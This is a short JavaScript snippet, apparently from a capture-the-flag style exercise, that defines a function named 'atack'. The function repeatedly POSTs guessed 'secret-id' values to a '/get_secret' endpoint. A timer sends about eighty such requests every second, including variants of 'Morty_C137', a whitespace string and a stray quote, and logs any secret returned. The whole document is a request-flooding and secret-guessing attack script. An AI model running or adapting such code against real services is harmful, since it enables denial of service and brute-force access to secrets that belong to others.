function atack(times,key){
  x= 0;
  while(x<times){
  $.ajax({
          type: "POST",
          url: "/get_secret",
          data: key,
          dataType: 'json',
          success: function (data) {
              console.log(data.secret, data.found);
          },
          error: function(data) {
              console.error(data); ;
          }
      });
  x++;
  }
}

setInterval(function(){

  atack(10,"secret-id=Morty_C13e7");
  atack(10,"secret-id=Morty_C13e7");
  atack(10,"secret-id=Morty_C137");
  atack(10,"secret-id=Mort3137");
  atack(10,"secret-id=Mort3137");
  atack(10,"secrd3137");
  atack(10,"                                                                             ");
  atack(10,"'xxxx");

},1000);
